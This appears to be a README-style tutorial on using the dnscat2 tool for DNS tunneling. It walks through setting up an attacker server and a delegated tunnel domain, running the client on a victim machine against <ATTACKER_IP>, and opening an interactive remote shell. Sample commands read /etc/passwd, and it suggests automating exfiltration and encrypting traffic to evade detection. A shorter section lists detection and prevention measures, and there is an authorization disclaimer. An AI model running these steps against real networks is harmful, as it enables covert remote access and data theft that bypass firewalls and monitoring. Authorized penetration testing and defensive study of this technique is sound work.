# **DNS Tunneling Attack using dnscat2**

## **Overview**
This document provides a detailed guide on using **dnscat2** to establish a **DNS-based covert communication channel**, allowing command execution and data exfiltration over DNS. This method is particularly useful in **restricted network environments** where only DNS traffic is permitted, bypassing firewalls that block direct internet access.

- **Attacker (Server):** Runs the **dnscat2** server to listen for incoming DNS queries.
- **Victim (Client):** Runs the **dnscat2** client to send encoded commands via DNS queries.
- **DNS Infrastructure:** Used as a covert channel to relay data, allowing an interactive shell over DNS.

## **Attack Context**
Many corporate and public networks (e.g., **hotels, airports, corporate environments**) restrict internet access but still allow **DNS traffic**. Attackers can exploit this by using DNS queries as a **covert data exfiltration channel** or **backdoor for remote access**.

### **🔹 Common Use Cases**
- **Bypassing Captive Portals & Firewalls**
- **Remote Shell Over DNS**
- **Data Exfiltration from Restricted Networks**
- **Stealthy Malware Command & Control (C2)**

---

## **1️⃣ Setting Up the `dnscat2` Server (Attacker)**
The **dnscat2 server** is responsible for handling incoming DNS queries and establishing a reverse shell with the client.

### **🔹 Step 1: Install Dependencies**
Install Ruby and `dnscat2` on the **attacker's machine**:
```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install
```

### **🔹 Step 2: Start the dnscat2 Server**
Run the **dnscat2** server to start listening for connections:
```bash
ruby ./dnscat2.rb
```
Expected output:
```
[+] dnscat2 server started
Listening for incoming DNS connections...
```

### **🔹 Step 3: (Optional) Configure the Authoritative DNS Server**
If using a **custom domain**, set up an **NS (Name Server) record**:
1. **Go to your domain's DNS settings**.
2. Create a new **NS record**:
   ```
   tunnel.example.com    NS    ns1.example.com
   ```
3. Add an **A record** for `ns1`:
   ```
   ns1.example.com    A    <YOUR_ATTACKER_SERVER_IP>
   ```
4. Restart the `dnscat2` server with the domain:
   ```bash
   ruby ./dnscat2.rb --dns domain=tunnel.example.com
   ```

---

## **2️⃣ Running the `dnscat2` Client (Victim)**
The **client machine** (inside the restricted network) needs to run `dnscat2` to establish a connection with the attacker's server.

### **🔹 Step 1: Install dnscat2 on the Victim Machine**
```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make
```

### **🔹 Step 2: Connect to the Attacker's DNS Server**
If connecting **directly to the attacker's IP**, run:
```bash
./dnscat --dns server=<ATTACKER_IP>
```
If using a **custom domain**, run:
```bash
./dnscat --dns domain=tunnel.example.com
```
Expected output:
```
[*] Connected to tunnel.example.com
[*] Session 1 opened!
```

---

## **3️⃣ Gaining a Remote Shell Over DNS**
Once the client is connected, open an **interactive session** on the **attacker’s machine**:
```bash
session -i 1
```
Start a shell session:
```bash
shell
```
Now, you have a **fully interactive shell over DNS**!

### **🔹 Example Commands in the Remote Shell**
```bash
whoami
ls -la
uname -a
cat /etc/passwd
```

---

## **4️⃣ Debugging & Troubleshooting**
### **🔹 Check If DNS Queries Are Reaching the Server**
Run the following on the attacker’s machine:
```bash
dig @<ATTACKER_IP> test.example.com TXT
```
If no response, check **firewall rules**:
```bash
sudo ufw allow 53/udp
sudo ufw allow 53/tcp
```

### **🔹 Capture DNS Traffic for Analysis**
Monitor incoming queries:
```bash
sudo tcpdump -i eth0 port 53
```

### **🔹 Use Verbose Mode for More Debugging**
```bash
./dnscat --verbose --dns domain=tunnel.example.com
```

---

## **5️⃣ Detection & Mitigation Strategies**
### **🔹 How Network Defenders Can Detect DNS Tunneling**
- **Monitor for High Volumes of DNS Queries**: Normal DNS usage is low; tunneling generates **unusually high traffic**.
- **Check for Large TXT Record Responses**: Standard DNS TXT records are **small**, whereas tunneling responses contain large encoded data.
- **Look for Suspicious Long Subdomains**: Tunneling encodes commands in **long subdomains** that are uncommon in normal DNS traffic.
- **Use DNS Filtering & Rate Limiting**: Enforce **query limits** and **inspect TXT record payloads**.
- **Deploy Deep Packet Inspection (DPI)**: Detects anomalies in **DNS payloads**.

### **🔹 How to Prevent This Attack**
- Block unauthorized external **NS delegation**.
- Restrict DNS queries to **known resolvers**.
- Use **DNS firewall solutions** (e.g., Cisco Umbrella, Cloudflare Gateway).
- Monitor **outbound DNS queries** for **excessive TXT lookups**.

---

## **6️⃣ Ethical & Legal Considerations**
⚠ **This tool should only be used for penetration testing, security research, and educational purposes with proper authorization.** Unauthorized use of DNS tunneling in real-world environments **may violate laws and network policies**.

## **7️⃣ Potential Enhancements**
- **Data Exfiltration via DNS**: Automate file transfers.
- **Encrypt Communications**: Use **AES encryption** to evade detection.
- **Custom Payloads**: Tunnel specific protocols over DNS.

---

## **8️⃣ Summary of Attack Process**
✅ **Attacker starts `dnscat2` server** to listen for DNS connections.  
✅ **Victim runs `dnscat2` client**, sending queries over DNS.  
✅ **Server establishes an interactive session** over DNS.  
✅ **Attacker gains a remote shell** inside the restricted network.  
✅ **Can be detected by monitoring DNS query volume, TXT records, and anomalies.**

---

## **9️⃣ License & Disclaimer**
- This project is released under the **MIT License**.
- The authors **do not encourage unauthorized use** of this tool in real-world scenarios where it may violate **legal or ethical guidelines**.

